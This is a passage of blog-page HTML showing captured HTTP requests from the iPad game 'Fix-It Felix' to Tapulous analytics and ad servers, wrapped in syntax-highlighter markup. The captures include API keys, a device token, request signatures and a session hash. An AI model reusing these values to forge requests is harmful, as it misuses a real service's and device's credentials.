class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-50">50</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-52">52</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-54">54</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-56">56</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-58">58</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-60">60</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-62">62</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-64">64</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-66">66</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-68">68</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">blog</span><span class="crayon-sy">.</span><span class="crayon-v">analytics</span><span class="crayon-sy">.</span><span class="crayon-v">tapulous</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">FixitFelix_Disney</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1666</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">multipart</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">boundary</span><span class="crayon-o">=</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-6"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-7"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-8"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-9"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-10"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-12"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-13"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"method"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-14">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-15"><span class="crayon-i">app_start</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-16"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-17"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"api_sig"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-18">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-19"><span class="crayon-i">P66Of4Tr9pMZShBRQcx4TyOMy8M</span><span class="crayon-o">%</span><span class="crayon-cn">3D</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-20"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-21"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"os_version"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-22">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-23"><span class="crayon-cn">5.1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-24"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-25"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"timestamp"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-26">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-27"><span class="crayon-cn">1342827611</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-28"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-29"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"token_info"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-30">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-31"><span class="crayon-cn">50b38ddd5dff76c9c43c1f896430c4a9b907c4e445be2c9161e727f01ff836b8c53bbd53511704b35f3ac9449efb5aa6</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-32"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-33"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"onlineflag"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-34">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-35"><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-36"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-37"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"api_key"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-38">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-39"><span class="crayon-i">E217E5E8</span><span class="crayon-o">-</span><span class="crayon-cn">59FC</span><span class="crayon-o">-</span><span class="crayon-cn">4EF3</span><span class="crayon-o">-</span><span class="crayon-cn">8165</span><span class="crayon-o">-</span><span class="crayon-i">DDC6F86B2D55</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-40"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-41"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"machine"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-42">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-43"><span class="crayon-i">iPad1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-44"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-45"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"model"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-46">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-47"><span class="crayon-i">iPad</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-48"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-49"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"bundle_id"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-50">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-51"><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">disney</span><span class="crayon-sy">.</span><span class="crayon-i">FixItFelixJr</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-52"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-53"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"session_hash"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-54">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-55"><span class="crayon-cn">04F24E10</span><span class="crayon-o">-</span><span class="crayon-i">FF3D</span><span class="crayon-o">-</span><span class="crayon-cn">4675</span><span class="crayon-o">-</span><span class="crayon-i">BEE2</span><span class="crayon-o">-</span><span class="crayon-i">D230D1FF0AB4</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-56"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-57"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"app_version"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-58">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-59"><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-60"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-61"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"DMOLibVersion"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-62">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-63"><span class="crayon-cn">2.50</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-64"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-e">SEP</span></div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-65"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-i">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"UTCTime"</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-66">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9abd919423952-67"><span class="crayon-cn">2012</span><span class="crayon-o">-</span><span class="crayon-cn">07</span><span class="crayon-o">-</span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-o">:</span><span class="crayon-cn">40</span><span class="crayon-o">:</span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">25200</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">PDT</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9abd919423952-68"><span class="crayon-o">--</span><span class="crayon-i">GOGO</span><span class="crayon-o">-</span><span class="crayon-cn">87dae883c6039b244c0d341f45f8</span><span class="crayon-o">-</span><span class="crayon-i">SEP</span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0161 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9ac8231684692" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /ads/get HTTP/1.1
Host: misc.apps.tapulous.com
User-Agent: FixitFelix_Disney/1.0 CFNetwork/548.1.4 Darwin/11.0.0
Content-Length: 1477
Content-Type: multipart/form-data; boundary=GOGO-87dae883c6039b244c0d341f45f8-SEP
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive

--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="method"

interstitial
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="api_sig"

j6552Xm%2FjGUjLYbKw3K4ha4hn%2Bg%3D
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="os_version"

5.1.1
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="language"

en
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="token_info"

50b38ddd5dff76c9c43c1f896430c4a9b907c4e445be2c9161e727f01ff836b8c53bbd53511704b35f3ac9449efb5aa6
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="timestamp"

1342827613
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="machine_type"

iPad1,1
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="api_key"

11111-22222-33333
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="model"

iPad
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="time_zone"

PDT
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="app_version"

1.0
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="interstitial_type"

1
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="format"

plist
--GOGO-87dae883c6039b244c0d341f45f8-SEP--</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-50">50</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ac8231684692-52">52</div><div class="crayon-num" data-line="crayon-53c98e7aa9ac8231684692-53">53</div><div class="crayon-num crayon-striped-num" 